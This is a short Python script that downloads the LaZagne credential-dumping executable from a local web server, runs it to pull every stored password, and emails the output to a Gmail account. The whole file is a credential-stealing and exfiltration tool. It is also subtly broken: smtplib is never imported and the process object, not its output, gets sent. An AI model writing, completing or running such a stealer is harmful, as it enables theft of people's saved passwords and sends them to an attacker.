#!usr/bin/env python

'''
    Download LaZagne from:
        https://github.com/AlessandroZ/LaZagne/releases/tag/2.3.2
    
    Run the windows executable by
    > LaZagne_x86.exe --help
    > LaZagne_x86.exe all
'''

import requests
import subprocess

fname = "LaZagne_x86.exe"
def download(url):
    global fname 
    fname = url.split("/")[-1]
    get_request = requests.get(url)
    print(get_request)
    with open(fname, "wb") as output_file:
        output_file.write(get_request.content)
    

def send_email(address, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(address, password)
    server.sendmail(address,address, message)
    server.quit()


download("http://192.168.1.197/" + fname)
command = fname + " all"
result = subprocess.Popen(command, shell=True)
send_email("email@gmail.com", "passkey", result)